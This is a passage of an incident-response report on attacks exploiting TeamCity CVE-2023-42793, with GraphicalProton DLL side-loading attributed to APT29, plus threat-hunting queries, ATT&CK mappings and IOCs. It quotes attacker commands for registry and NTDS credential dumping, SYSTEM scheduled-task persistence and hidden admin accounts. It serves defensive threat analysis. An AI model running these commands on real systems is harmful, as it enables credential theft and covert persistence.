c7f2137331105686aa4eb39bcfe1bae23fa19956 6 jaspic-providers.xml Apache Tomcat configuration file ed6c18c49a8bde1170c97698aeb1b85292a1967d 7 mscoree.dll Legitimate DLL file from Microsoft ada02e4442daa69427a2815a8819f3a1285ad772 8 mscorees.dll Malicious DLL 2df317b8a408d2ad5c94b9de6f20bbef03e46066 9 omzu5a.ar Unknown file detected as data file 38860565592ce018b415ecd72bc2fb1a0742702c 10 pdhui_1.dll Malicious DLL 5ce062f210e1a5026cb53e9949865312ee477e3c 11 poc.py PoC python code used by the actor to exploit TeamCity vulnerability CVE-2023-42793 bcbadf744954660f9a46324649eda6a14d724cbc 12 rr.exe Unknown executable 18192bb4aaa1b72104be4d26460b55f31ca65baf 13 server.py Python HTTP server code b2829fd893f26cb513018c4e03428f1ef5915da0 14 sudoers Linux sudoer config file d3a19eb3db9f7fe8d984e124da95a4c1cafa332e 15 winmms.dll Malicious DLL 3a32e516c037c37f7bf83171e167511ba53870a7 16 winmm.dll Legitimate DLL file from Microsoft d5cc1f2549fa138a931ad43d5d81d3a367c0de6e 17 zabbix.zip Contains pdhui_1.dll (a malicious DLL) and other legitimate Zabbix (opensource monitoring software) files 281bb0dadc789b89f7ae30d5f4bdeae57c66b0e1 Table 2. Descriptions of files found on the C2 server 103.76.128[.]34. Analysis of the code in the poc.py file identified the script as a custom Python implementation of an exploit for the TeamCity vulnerability CVE-2023-42793. You can see the request URL found in the log and the Python code used to generate the request in Figure 8. Figure 8: A snippet of code from poc.py found on the C2 web server, and a snippet of the TeamCity log showing a similar request received by the victim during exploitation. Comparing the structure of a request sent using this script and the commands executed from the victim logs, it is almost certain that this script was used to deliver the exploit to the victim TeamCity server (HOST_1_TEAMCITY ). This links the IP extracted from the scheduled task (103[.]76[.]128[.]34) to the source of the exploitation from the logs shown in Figure 9 (45[.]138[.]16[.]63). Using the FortiGuard Central Threat System (CTS), we could also see that the IP address associated with the exploitation has been linked to other significant malicious activity. Of the 171 domains associated with this IP, 92 have been tagged with high confidence as malicious, and 78 have been tagged with high confidence as suspicious. Only one of the domains has been tagged as low risk (Figure 9). Figure 9: FortiGuard CTS information on the IP associated with the main threat actor TeamCity exploitation in the victim environment. The other element of interest in the scheduled task created by the main threat actor was the DLL file, 'AclNumsInvertHost.dll.' Our analysis identified that the DLL AclNumsInvertHost.dll has ten file sections. The most notable was '.fy55f5', which is a user-modified section. This section has an MZ header (indicating it is a Windows portable executable), but the remainder of the code has a high entropy of 7.99, which is typically indicative of encryption. The '.fy55f5' section can be seen in Figure 10. Figure 10: Encrypted code section of the AclNumsInvertHost.dll executed as part of the main threat actor's scheduled task persistence. The IR team believes that this '.fy55f5' section of the DLL contains the final payload, which is decrypted at runtime. There are a number of anti-debug techniques implemented within the DLL file code that inhibited dynamic analysis during the engagement. To understand the DLL functionality more quickly, we performed comprehensive Yara scanning of all the files pulled from the threat actors' webserver. The AclNumsInvertHost.dll library and multiple other DLL files matched on a Yara rule for a known malware family called 'GraphicalProton.' The positive Yara rule match was developed by Insikt Group from Recorded Future and is based on a specific API calling method employed by previously observed GraphicalProton samples. A match for this rule is a high-confidence indicator of GraphicalProton. The results of the matching Yara scan are shown in Figure 11. Figure 11: Yara rule for GraphicalProton matched against multiple DLL files found on the main threat actor opendir server. The files in Figure 11 also matched the Yara rule M_Dropper_BURNTBATTER_1, which searches for the custom chaskey implementation. This Yara rule was from the article, 'Backchannel Diplomacy: APT29's Rapidly Evolving Diplomatic Phishing Operations,' by Mandiant [9] . GraphicalProton is a malware historically employed by group APT29. While this tooling is confidently linked to APT29 (Mandiant) or BlueBravo (Recorded Future), the victimology and initial access vector employed by the main threat actor throughout earlier stages of this intrusion does not align with currently reported APT29 campaigns. However, a previous well-known attack from APT29 targeted the company Solarwinds, using the same build of the TeamCity management tool [10] . While the IR team could not attribute this activity to APT29 with high confidence, associated threat intelligence was used to focus our investigation further. [11] At this stage of the intrusion, FortiEDR detected and blocked this scheduled task from executing due to its suspicious use of rundll32.exe and a machine learning assessment of the previously unobserved DLL 'AclNumsInvertHost.dll.' This forced the main threat actor to attempt alternative methods of execution. The first alternative method was to use the TeamCity exploit on HOST_1_TEAMCITY to download the 'iisexpresstray.exe' and 'mscoree.dll' files from the same C2 through PowerShell. These two files were written to the directory' C:\\Windows\\WinStore\\'. The 'iisexpress.exe' file is a legitimate signed installer executable for IISExpress, a lightweight implementation of IIS provided by Microsoft [12] . However, downloaded alongside this legitimate installer was 'mscoree.dll,' a malicious DLL file with the same name as a legitimate DLL (T1036.005). [13] The combination of these two files would allow the threat actor to employ DLL search order hijacking (T1574.001) [14] to execute their malicious DLL when the legitimate IISExpress executable is executed. To execute this side-loading attack, the main threat actor created another scheduled task using the following command executed via the TeamCity exploit: schtasks.exe /create /SC ONSTART /tn \"\\Microsoft\\Windows\\IISUpdateService\" /tr \"C:\\Windows\\WinStore\\iisexpresstray.exe\" /RU \"SYSTEM\" /f After the scheduled task was created, the threat actor executed the scheduled task using the following command: schtasks.exe /run /tn \"\\Microsoft\\Windows\\IISUpdateService\" When the 'iisexpresstray.exe' file was executed on the HOST_1_TEAMCITY, a separate thread was created by the malicious DLL file that tried to access the system credentials through lsass.exe. This attempt was also blocked by FortiEDR. This is shown in the event graph in Figure 12. Figure 12: FortiEDR blocked access to lsass.exe from iisexpresstray.exe. The main threat actor had used multiple legitimate software in this attack. The list of legitimate files is shown in the table below. Some of the executables listed in Table 3 were recovered from the opendir [15] web server. Sr. No. File Name Description 1 iisexpresstray.exe Legitimate IIS Express exe used for the execution of malicious DLL mscorees.dll 2 MpCmdRun.exe Legitimate Defender command line utility used for execution of malicious DLL MpCmdHelp.dll 3 FlashUtil_ActiveX.exe Legitimate Flash exe used for the execution of malicious DLL oleac.dll 4 zabbix_agentd.exe Legitimate executable to Zabbix software used to load the malicious DLL pdhui_1.dll Table 3. List of legitimate software executables observed in the attack and on the C2 server, which are used to load malicious DLL files. Since FortiEDR blocked the execution of this second malicious DLL file, the main threat actor changed their approach and attempted to dump the registry using Windows utility reg.exe directly through further TeamCity exploitation. Unfortunately for the main threat actor, FortiEDR blocked this execution due to the triggered rules 'Access to Critical System Information' and 'Connection Attempt from a Hidden Process' under its 'Exfiltration Prevention' security policy. A screenshot of the related FortiEDR event is shown in Figure 13. Figure 13: Attempt to dump system credentials using reg.exe was blocked by FortiEDR. These attempts represent only two of the many credential dumping techniques the threat actor attempted to employ within the victim environment. Fortunately, the FortiEDR software installed on the majority of their endpoints, including the victim server, blocked these techniques. The associated EDR security events also generated multiple alerts. Unfortunately, the targeted organization made numerous broad exceptions for this malicious behavior. This was likely due to the behavior originating from the TeamCity application, so they were incorrectly assessed as a false positive. These exceptions are outlined below: allow rundll32.exe to run AclNumsInverHost.dll when rundll32.exe is executed by cmd.exe. allow reg.exe to run as a hidden process allow reg.exe to access critical system information (credential dumping) allow natid.sys to be loaded (a suspicious driver dropped by the threat actor) allow rundll32.exe to execute AclNumsInvertHost.dll and create a thread in any lsass.exe process allow rundll32.exe to execute AclNumsInvertHost.dll and create a thread in any svchost.exe process allow any execution of PowerShell and associated rule violations These exceptions removed the constraints around the adversary's ability to fully employ their TeamCity exploitation, allowing the main threat actor to continue their execution unrestricted by FortiEDR. After these exceptions were set, the main threat actor was able to successfully dump the registry of the Windows host HOST_1_TEAMCITY to gain access to local user credentials (T1003.002) [16] . To achieve this, the threat actor used reg.exe to dump the SYSTEM registry hive (T1003.002 [17] ) using the command below: reg.exe save HKLM\\SYSTEM \u201cC:\\Windows\\temp\\1\\sy.sa\u201d /y This can be seen in the FortiEDR Threat Hunting event shown in Figure 14. Figure 14: FortiEDR Threat Hunting event associated with the reg.exe process being used to dump the SYSTEM registry hive. At this stage, the main threat actor continued to employ their TeamCity exploit for execution, trying alternative techniques to establish a more robust foothold on the HOST_1_TEAMCITY. They used their access to create a Windows account, 'oldadministrator' (T1136.001 [18] ), added the newly created account to the local administrators group, and made the account a special account by adding it to the registry path 'NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\Userlist' with the DWORD value 0. When a Windows user account is added to this registry location with value 0, the account is not shown on the Windows GUI login screen. This was likely done to hide their new access and ensure persistence from direct observation by normal system users. However, the IR team did not observe that the main actor ever used this newly created 'oldadministrator' account. Log events associated with these activities can be observed in the teamcity-server.log snippet shown in Figure 15. Figure 15: Extract from the TeamCity application logs showing the commands used to create a new local Windows user on the victim endpoint. At this time, the host HOST_1_TEAMCITY was patched for CVE-2023-42793. The IR team verified the patch was successful and that there was no further exploitation of this vulnerability on this host following the installation of the patch. Unfortunately, the threat actor had already created alternative access through their GraphicalProton implant and had already begun laterally moving to other hosts within the victim network through SMB, RDP, and remote WMIC commands. The hosts HOST_3_SVR and HOST_4_SVR were targeted using WMIC commands (T1047) [19] from the original compromised host, HOST_1_TEAMCITY. The network connections linked to this behavior were established using explicit credentials. This indicates that the main threat actor had successfully pulled credentials prior to this activity. The IR team thinks this WMIC activity was likely conducted to execute a GraphicalProton DLL through either rundll32 proxy execution like that demonstrated in the previously discussed scheduled task or through search order hijacking using one of the binary and DLL pairs pulled from the main threat actor C2 opendir web server. You can see evidence of the network connection associated with this WMIC activity from the Windows event log in Figure 16. Figure 16: Windows log screenshot showing WMIC.exe execution remotely from HOST_1_TEAMCITY to HOST_4_SVR On the HOST_2_SVR, the main threat actor employed a different lateral movement technique by establishing an RDP connection from the HOST_1_TEAMCITY. This connection was used to create multiple suspicious files in the 'C:\\Windows\\SchCache\u2019 directory on HOST_2_SVR. Two DLL files (\u2018oleacc.dll\u2019 and \u2018oleac.dll\u2019) and one executable file (\u2018FlashUtil_ActiveX.exe\u2019) were created in this directory. When the IR team ran a Yara scan against these files, the DLL file oleac.dll matched the Yara rule for GraphicalProton. The remaining files, oleacc.dll and FlashUtil_ActiveX.exe, were determined to be non-malicious Microsoft-signed files. The main threat actor then created persistence for this file through a scheduled task. This time, the task was named 'WindowsActiveX' and was created to execute the 'C:\\Windows\\SchCache\\FlashUtil_ActiveX.exe' file when Windows starts. This shows the use of another legitimate executable to perform search order hijacking to load a malicious GraphicalProton DLL. The command used to create this scheduled task can be observed in the FortiEDR Threat Hunting event, shown in Figure 17. Figure 17: FortiEDR Threat Hunting event showing the creation of a scheduled task for FlashUtil_ActiveX.exe In another credential dumping attempt, the main threat actor tried to dump active directory credentials using the Windows utility \u2018ntdsutil.exe\u2019 on the host HOST_2_SVR. They tried to dump credentials using the following command: ntdsutil.exe 'ac i ntds' 'ifm' 'create full C:\\tempp' q q This command aims to dump the ntds.dit file, the SYSTEM registry hive, and the SECURITY registry hives in the given path (in this case, \u2018C:\\tempp\u2019). Threat actors can often dump password hashes from these files offline using tools like mimikatz. [20] FortiEDR blocked this activity, and the associated security event can be observed in Figure 18. Figure 18: Execution of ntdsutil.exe to dump ntds.dit file was blocked by FortiEDR. In addition to this scheduled task, the IR team found another GraphicalProton DLL in the \u2018C:\\Program Files\\Windows Defender\u2019 directory. This directory contained an executable PE file, \u2018MpCmdRun.exe,\u2019 and DLL files, \u2018MpCmdHelp.dll\u2019 and \u2018MpClient.dll.\u2019 One of the files (MpCmdHelp.dll) matched against the Yara rule for malware GraphicalProton, and the second DLL file, MpClient.dll, is a legitimate library used by \u2018MpCmdRun.exe.\u2019 Like the \u2018FlashUtil_ActiveX.exe\u2019 example discussed earlier in this report, the \u2018MpCmdRun.exe\u2019 is a legitimate binary vulnerable to search order hijacking. The \u2018MpCmdRun.exe\u2019 binary is an official command-line tool used to perform various operations related to Microsoft Defender Antivirus. The default path of this binary is \u2018C:\\Program Files\\Windows Defender.\u2019 At this investigation stage, the team performed large-scale Yara scanning to identify additional potentially compromised hosts. This scanning identified DLL files matching the GraphicalProton signature written to disk on the hosts HOST_6_SQL and HOST_7_SVR. On both hosts, a task named \u2018WindowsDefenderService\u2019 that executed the GraphicalProton DLLs was created, matching the tradecraft of the previously discussed scheduled tasks. One of the scheduled task files associated with these tasks can be seen in Figure 19. Figure 19: Schedule task file for proxy execution of the malicious GraphicalProton DLL file identified on HOST_6_SQL. The IR team also found a network login to HOST_5_SVR from the primary infected HOST_1_TEAMCITY host. Shortly after this login event, an instance of rundll32 used for proxy execution of another GraphicalProton sample was started. However, the process crashed. This resulted in a memory dump of the rundll32.exe process. The IR team performed strings analysis of the memory dump and found URLs of graph.microsoft[.]com and 1drv[.]ms, which are legitimate domains related to Microsoft OneDrive operations. The IR team also found an email address (quentparoty[@]outlook.com) in the memory dump, although this indicator has not been linked to any known IOCs. However, it has been included for completeness. Significant strings extracted from the memory dump can be seen in Figure 20. Figure 20: Strings from memory analysis of crash dump showing email address and URL of OneDrive. Similar network indicators were identified when we executed the AclNumsInvertHost.dll file using rundll32.exe in a virtual analysis environment. The IR team also observed connections to api.dropboxapi[.]com from the rundll32.exe in the Threat Hunting data of the victim environment. The GraphicalProton report [21] from Insikt Group from Recorded Future showed that researchers had previously observed GraphicalProton samples employ Microsoft OneDrive and Dropbox as part of their C2. The malicious DLL samples were shared with analysts from the FortiGuard Forensics Team for further malware analysis. They confirmed that the behavior of the multiple malicious DLL matches GraphicalProton malware behavior. The malicious DLL was communicating with Microsoft OneDrive, and the following information was obtained in JSON format from this communication. Key Value @odata.context https://graph[.]microsoft[.]com/v1.0/$metadata#users('quentparoty%40outlook[.]com')/drive/root/$entit name blatant webUrl https://1drv[.]ms/f/s!AGVbcHFCdi2qmmw displayName quent-application driveId aa2d764271705b65 driveType personal id AA2D764271705B65!106 folder name quent-application path /drive/root:/Apps/quent-application Key Value @odata.context https://graph[.]microsoft[.]com/v1.0/$metadata#users('girmisdrong%40outlook.com')/drive/root/$entity name excerpt2002VI webUrl https://1drv[.]ms/f/s!AALb1YPGQLqThmw displayName GrimiApplication driveId 93ba40c683d5db02 driveType personal id 93BA40C683D5DB02!103 folder name GrimiApplication path /drive/root:/Apps/GrimiApplication The analyst team also observed numerous anti-debugging techniques in malicious DLL files, such as a call to NtQueryObject to look for the \u201cDebugObject\u201d variable. It also has strings such as \u201cOllydbg,\u201d probably to check if the Ollydbg.exe process is running. If the process is found running, the malware may then terminate itself. Given our understanding of the main threat actor\u2019s operations, we determined that persistence was still possible. The IR team provided recommendations on removing existing adversary accesses and persistence. A high-level view of the containment and eradication actions recommended are provided below: Blocking the IP addresses used by threat actors Removing TeamCity software accounts created by threat actors Removing Windows accounts created by threat actors Removing backdoors created by threat actors Removing malicious files dropped by threat actors After implementing these containment and remediation actions by the victim security team, no further malicious activity has been observed. Other Threat Actor Activity In addition to the main threat actor, there were other threat actors who exploited the TeamCity vulnerability. One of these threat actors used their RCE access through the exploit to create a new TeamCity user via the TeamCity API. They then added the \u2018System administrator\u2019 role to this newly created user account. No evidence was found to indicate that this newly created account was ever used once it was created. Logs related to this activity were recorded in the teamcity-server.log and can be seen in Figure 21. Figure 21: TeamCity log showing the creation of a new user and assigning an admin role to the user. Another threat actor separately attempted to download and execute an executable from an Amazon S3 bucket. Using an Amazon S3 Bucket instead of a separate C2 for file downloads differs from the actions of the main threat actor. This is significant, as many organizations include Amazon Services URLs in their allowlist. The threat actor used the \u2018DownloadFile\u2019 method of the PowerShell \u2018WebClient\u2019 class to download the Amazon-hosted payload. The file was saved as \u20181.exe\u2019 in the path \u2018C:\\Windows\\Temp\\1.exe\u2019. After downloading this file, the threat actor attempted to execute it using the command \u2018cmd.exe /c C:\\Windows\\Temp\\1.exe\u2019. Windows Defender logs indicate this file was detected as Trojan:Script/Phonzy.B!ml malware by Windows Defender shortly after download and was deleted before it could be executed. Associated log events within the teamcity-server.log linked to this download activity are shown in Figure 22. Figure 22: TeamCity log showing download and execution of 1.exe by the threat actor. Another threat actor used their TeamCity exploit to download and execute the installer for legitimate remote access software AnyDesk on the HOST_1_TEAMCITY. The AnyDesk software was installed with the \u2018--start-with-win' parameter, making it auto-start on boot. The \u2018--silent\u2019 parameter was also used, which prevents the AnyDesk application from showing any messages or errors during execution. The threat actor then set a password to AnyDesk and executed it with the \u2018--get-id' parameter to retrieve the AnyDesk-ID. This ID is used to connect to an instance of AnyDesk. This software is an implementation of a command-and-control technique (T1219 [22] ) and also supports persistence as the threat actor can use the AnyDesk-ID to connect to a running instance of the software. Log events associated with these activities in the teamcity-server.log snippet are shown in Figure 23. Figure 23: The TeamCity log showing the installation and execution of the Anydesk remote access tool. The Fortinet IR team was able to link connections made from the host HOST_1_TEAMCITY from the AnyDesk application to IP address 92.38.177[.]14. When we investigated, it was found to be an AnyDesk software relay address. Using relays as part of AnyDesk infrastructure allows threat actors to abstract their own infrastructure from intrusions. FortiGuard CTS information for the relay IP is shown in Figure 24. It\u2019s worth noting that FortiGuard CTS marked this as clean because AnyDesk is a common remote management tool that, by default, uses AnyDesk infrastructure, which is not malicious by itself. Figure 24: Fortiguard CTS screen with information about AnyDesk relay IP address. The connections made by AnyDesk.exe can be seen in Figure 25. Figure 25: An Anydesk.exe TCP/IP connection from host HOST_1_TEAMCITY to the internet. These actors tried one or two methods but did not conduct further activity on the server or victim network. They likely lacked the knowledge or interest to pursue further intrusion on the victim network, as their initial efforts were ineffective. Conclusion This article provided details of several intrusions where the TeamCity vulnerability CVE-2023-42793 was exploited to gain access to the victim network. Observed exploitation originated from multiple disparate threat actors who employed numerous diverse post-exploitation techniques in an attempt to gain a foothold in the victim network. It should be noted that this activity occurred after the vendor (JetBrains) had provided a valid patch. While the security controls in place within the victim's environment were able to keep the majority of adversaries at bay, a failure to adequately triage alerts generated by the victim's EDR (FortiEDR) and subsequent downgrading of protections opened gaps in the victim's defenses. This allowed the main threat actor to establish a foothold and eventually gain the access required to maneuver freely through the network. As part of this intrusion, the main threat actor employed the GraphicalProton malware to maintain access. The main threat actor primarily used Scheduled Tasks (T1053.005 [23] ) to execute these GraphicalProton payloads. Their preferred method of defense evasion for these scheduled tasks was rundll32 proxy execution, but the threat actor was also able to employ several legitimate third-party binaries that were vulnerable to search order hijacking to execute their malware. Given the technique crossover with previously reported activity and the identification of the GraphicalProton payload, FortiGuard believes with medium confidence that this attack was part of a new BlueBravo (tracked by Recorded Future [24] )/APT29 (tracked by Mandiant [25] ) campaign. Of particular note are the significant OPSEC considerations employed throughout the intrusion (discounting the opendir web server fumble): the use of compromised infrastructure local to the victim, search order hijacking with legitimate DLLs added after execution, the quality of masquerading, and the use of single-use infrastructure components. MITRE ATT&CK mappings, mitigation suggestions, and threat-hunting queries are provided below to assist organizations in identifying similar activity in their environments. IOCs have also been provided for completeness. Fortinet Protections The malware described in this report are detected and blocked by FortiGuard Antivirus as: AntiVirus: W64/GraphicalProton.A!tr AntiVirus: W64/Dukes.O!tr AntiVirus: W32/Dukes.P!tr AntiVirus: W32/PossibleThreat FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is a part of each of those solutions. As a result, customers who have these products with up-to-date protections are protected. Fortinet has also released an IPS signature to proactively protect our customers from the threats contained in the report: CVE-2023-42793: JetBrains.TeamCity.CVE-2023-42793.Authentication.Bypass The URLs are rated as \u201cMalicious Websites\u201d and \u201cMalicious Activities Found\u201d by the FortiGuard Web Filtering service. FortiGuard IP Reputation and Anti-Botnet Security Service proactively block these attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. If you believe this or any other cybersecurity threat has impacted your organization, please contact our Global FortiGuard Incident Response Team . Threat Hunting The following Threat Hunting query will search for a network socket connected by rundll32.exe, which has the same filenames of DLL as those observed in this intrusion. Type: (\"Socket Connect\") AND Source.Process.Name: (\"rundll32.exe\") AND Source.Process.CommandLine: (\"\\\"AclNumsInvertHost.dll\\\", AclNumsInvertHost\" OR \"\\\"UnregisterAncestorAppendAuto.dll\\\", UnregisterAncestorAppendAuto\") The following Threat Hunting query will search for process creation events where rundll32.exe launches cmd.exe and executes any of the commands executed by the malicious DLL upon execution. Type: (\"Process Creation\") AND Source.Process.Name: (\"rundll32.exe\") AND Target.Process.File.Name: (\"cmd.exe\") AND Target.Process.CommandLine: (\"\\/C \\\"chcp 65001 \\> NUL & netstat \\-afn \\-p TCP\\\"\" OR \"\\/C \\\"chcp 65001 \\> NUL & wmic datafile where Name\\=\\\"C\\:\\\\\\\\Windows\\\\\\\\system32\\\\\\\\ntoskrnl.exe\\\" get Version\\\"\" OR \"\\/C \\\"chcp 65001 \\> NUL & echo %userdomain%\\*%computername%\\*\\*%username%\\\"\" OR \"\\/C \\\"chcp 65001 \\> NUL & tasklist\\\"\") The following Threat Hunting query will search for process creation of scheduled tasks using schtasks.exe with type ONLOGON or ONSTART and with the following filenames (iisexpresstray.exe, AclNumsInvertHost.dll, UnregisterAncestorAppendAuto.dll), which were used throughout this intrusion for persistence. Type: (\"Process Creation\") AND Target.Process.File.Name: (\"schtasks.exe\") AND Target.Process.CommandLine: (create \\/SC AND (ONLOGON OR ONSTART)) AND Target.Process.CommandLine:(iisexpresstray.exe OR AclNumsInvertHost.dll OR UnregisterAncestorAppendAuto.dll OR DefenderUPDService OR IISUpdateService) The following Threat Hunting query will search for an event where a particular task creation was being verified by the threat actor. Type: (\"Process Creation\") AND Target.Process.File.Name: (\"schtasks.exe\") AND Target.Process.CommandLine: (\"\\/Query \\/TN \\\\Microsoft\\\\Windows\\\\DefenderUPDService \\/FO LIST \\/V\") The following Threat Hunting query will search for an event where TeamCity process (java.exe) creates a process of Windows task management utility (schtasks.exe). Keep in mind that this query might have false positives where there is an official need for Java applications to launch the schedule task utility. Type: (\"Process Creation\") AND Source.Process.Name: (\"java.exe\") AND Target.Process.File.Name: (\"schtasks.exe\") The following Threat Hunting query will search for an event where schtasks.exe is the target process and the command line contains rundll32.exe. Keep in mind this query might generate false positives in envrionments where there are scheduled tasks having rundll32.exe are created using schtasks.exe. Type: (\"Process Creation\") AND target.Process.Name: (\"schtasks.exe\") AND Target.Process.CommandLine: (rundll32.exe) The following Threat Hunting query will search for an event where rundll32.exe will connect to login.microsoftonline[.]com or graph.microsoft[.]com over HTTP protocol. Keep in mind that this query might generate false positives where there is a legitimate use of rundll32.exe to connect to these URLs. Type: (\"HTTP Request\") AND Source.Process.Name: (\"rundll32.exe\") AND URL: (\"https\\:\\/\\/login.microsoftonline.com\\:443\" OR \"https\\:\\/\\/graph.microsoft.com\\:443\") MITRE ATT&CK TA0042: Resource Development Technique Technique Description Observed Activity T1584.004 Compromise Infrastructure: Server The threat actor(s) had compromised a server of an educational institution. A malicious DLL file connected to this compromised server as a C2. The IR team suspects that this server acts as a connection forwarder to the real C2. Mitigation Mitigation is difficult using preventive controls as infrastructure is outside the scope of the enterprise. Fortinet Security Fabric Controls: N/A TA0043: Reconnaissance Technique Technique Description Observed Activity T1595.002 Active Scanning: Vulnerability Scanning The threat actor(s) performed vulnerability scans using Nuclei to check if the TeamCity server was vulnerable for CVE-2023-42793. Mitigation Traffic pattern inspection for the specific URL pattern used in a vulnerability check can be done. Also, monitoring of network data for uncommon data flows can be done to identify abnormal activity. Fortinet Security Fabric Controls: FortiGate, FortiSIEM TA0001: Initial Access Technique Technique Description Observed Activity T1190 Exploit Public-Facing Application The threat actor(s) exploited the vulnerability CVE-2023-42793 of the public-facing TeamCity software host. Mitigation Web Application Firewalls may be used to limit exposure of applications to prevent exploit traffic from reaching the application. Segment externally facing servers and services from the rest of the network with a DMZ or on separate hosting infrastructure. Fortinet Security Fabric Controls: FortiWeb, FortiGate, FortiSIEM TA0002: Execution Technique Technique Description Observed Activity T1059.003 Command and Scripting Interpreter: Windows Command Shell The threat actor(s) executed cmd.exe through the vulnerable TeamCity software for various activities, including the download and execution of malicious files. Mitigation Blocking network connections from cmd.exe to external IP addresses, except for those on an allow list, is the best way to limit this very prevalent TTP. Detection of cmd.exe being spawned by software services (e.g. java.exe in current scenario). Fortinet Security Fabric Controls: FortiEDR, FortiGate, FortiSIEM (detection) Technique Technique Description Observed Activity T1053.005 Scheduled Task/Job: Scheduled Task The threat actor(s) used Windows Task Scheduler to create scheduled tasks to execute dropped payloads and maintain persistence. Mitigation Audit the scheduled task on the hosts using a SIEM tool to identify abnormal tasks. Fortinet Security Fabric Controls: FortiSIEM (detection), FortiEDR, FortiClient Technique Technique Description Observed Activity T1047 Windows Management Instrumentation The threat actor(s) used the Windows Management Instrumentation command-line utility from HOST_1_TEAMCITY to connect to multiple other hosts for lateral movement. Mitigation Use application control to block execution of wmic.exe if it is not required for a given system or network. This ensures that potential misuse is prevented. Advanced EDR products with behavioral detection can detect and block the use of WMIC for malicious behaviors. Fortinet Security Fabric Controls: FortiSIEM (detection), FortiEDR, FortiClient TA0003: Persistence Technique Technique Description Observed Activity T1136.001 Create Account: Local Account The threat actor(s) created a Windows local administrator account through cmd.exe. Mitigation New account creation should be audited using Windows logs. Fortinet Security Fabric Controls: FortiSIEM (detection) Technique Technique Description Observed Activity T1053.005 Scheduled Task/Job: Scheduled Task The threat actor(s) used Windows Task Scheduler to create scheduled tasks to execute dropped payloads and maintain persistence. Mitigation Audit the scheduled task on the hosts using SIEM tool for abnormal tasks. Fortinet Security Fabric Controls: FortiSIEM (detection) TA0005: Defense Evasion Technique Technique Description Observed Activity T1574.001 Hijack Execution Flow: DLL Search Order Hijacking Threat actor(s) downloaded a number of legitimate signed executable files and malicious DLLs in the same folder. The malicious DLLs were named similarly but were different from their legitimate counterparts. A full list of vulnerable legitimate software used in this way is available in Table 2 in the report. Mitigation Enable Safe DLL Search Mode to force search for system DLLs in directories with greater restrictions. Fortinet Security Fabric Controls: FortiEDR, FortiClient Technique Technique Description Observed Activity T1564.002 Hide Artifacts: Hidden Users Threat actor(s) created a new local admin account and made that account a special account by adding HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\Userlist to the registry path. This prevented the new account from being displayed on the GUI login screen. Mitigation Monitor executed commands and arguments that could be used to add a new user and subsequently hide it from login screens. Advanced EDR solutions like FortiEDR can be used to monitor for associated registry changes. Windows advanced logs can be ingested into SIEM to monitor these activities. Fortinet Security Fabric Controls: FortiEDR, Windows Advanced Logging, FortiSIEM, FortiSOAR Technique Technique Description Observed Activity T1027.002 Obfuscated Files or Information: Software Packing Malicious DLL files were obfuscated to avoid analysis. Mitigation Employ heuristic-based malware detection on endpoints and generate alerts for executables packed with known packers. Fortinet Security Fabric Controls: FortiEDR, FortiClient Technique Technique Description Observed Activity T1218.011 System Binary Proxy Execution: Rundll32 The actor(s) used the Windows utility rundll32.exe to execute malicious DLL files (GraphicalProton). This appeared to be the adversary\u2019s primary/preferred method of DLL execution. Mitigation A behavioral detection tool such as FortiEDR can be used to detect and block malicious activities performed by files executed via rundll32.exe. Fortinet Security Fabric Controls: FortiEDR, FortiClient, FortiSIEM, FortiSOAR TA0006: Credential Access Technique Technique Description Observed Activity T1003.002 OS Credential Dumping: Security Account Manager The threat actor had tried to dump SAM using the command \u2018reg.exe save HKLM\\SAM.\u2019 Mitigation A modern EDR solution should detect and mitigate attempts to access and dump the SAM registry hive. Fortinet Security Fabric Controls: FortiEDR Technique Technique Description Observed Activity T1003.003 OS Credential Dumping: NTDS The threat actor had tried to dump Ntds.dit using the Windows utility ntdsutil.exe. Mitigation A modern EDR solution should detect and mitigate attempts to access and dump NTDS files. Fortinet Security Fabric Controls: FortiEDR TA0011: Command & Control Technique Technique Description Observed Activity T1071.001 Application Layer Protocol: Web Protocols The malicious DLL file made HTTPS web requests to the adversary\u2019s C2. Mitigation Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Firewalls should be able to block network connections with anomalous user-agent strings associated with non-standard browsers. This can also reduce the effectiveness of this TTP if the adversary does not configure a user-agent to match the environment. It is possible to block C2 IPs/URLs obtained from a threat intel feed at the gateway level. Fortinet Security Fabric Controls: FortiEDR, FortiGate, FortiSIEM, FortiGuard Threat Intelligence Technique Technique Description Observed Activity T1219 Remote Access Software The actor downloaded AnyDesk software as an alternative C2 method to gain direct remote access to victim endpoints. Mitigation Application whitelisting is a great way of reducing the effectiveness of this TTP. Where this is not achievable, a modern EDR solution should be able to flag remote access software and other PUPs as suspicious so they can be allowed explicitly if used legitimately in an environment. A network-level IDS (Intrusion Detection System) with the ability to detect AnyDesk software traffic would be able to block this traffic. Fortinet Security Fabric Controls: FortiEDR, FortiClient, FortiNDR, FortiAnalyzer, FortiSIEM, FortiSOAR Technique Technique Description Observed Activity T1090.003 Proxy: Multi-hop Proxy The actor used the Tor network to launch exploit attacks. Mitigation Traffic to known anonymity networks and C2 infrastructures can be blocked through the use of network allow and block lists. Firewalls with deep inspection (e.g. FortiGate [26] ) can block Tor traffic through Application Control. Fortinet Security Fabric Controls: FortiGate, FortiEDR, FortiClient IOCs The following IOCs are from the investigation, analysis of the samples, and subsequent activity observed on the same host between initial detection and remediation by the customer. In addition to these IOCs directly observed by the FortiGuard IR team, several samples that match the characteristics of observed samples have been included to assist with detecting historical activity. Indicator Indicator Type Associated Tactic Notes a66d76d86448965e57d7be96a57529c497e4b99d SHA1 Hash Execution File hash of 1.exe downloaded on host d4411f70e0dcc2f88d74ae7251d51c6676075f6f File hash of malicious DLL AclNumsInvertHost.dll f836173805a8c4d4ee319fdefe4a5e92f3f55f32 File hash of malicious DLL UnregisterAncestorAppendAuto.dll a4b03f1e981ccdd7e08e786c72283d5551671edf File hash of malicious DLL ModeBitmapNumericAnimate.dll 8f5780056107dbc2bb59d63f454d8523091ddde2 File hash of malicious DLL MpCmdHelp.dll 51aa6e5186ede77545e99b14b8f7e8180a0c6933 File hash of malicious DLL oleac.dll 4fed3d5de4df20d961831be6194b9d595b943bc9 File hash of malicious DLL PerformanceCaptionApi.dll 682b9ac9448707024985ad54476acfbf642a03b9 File hash of 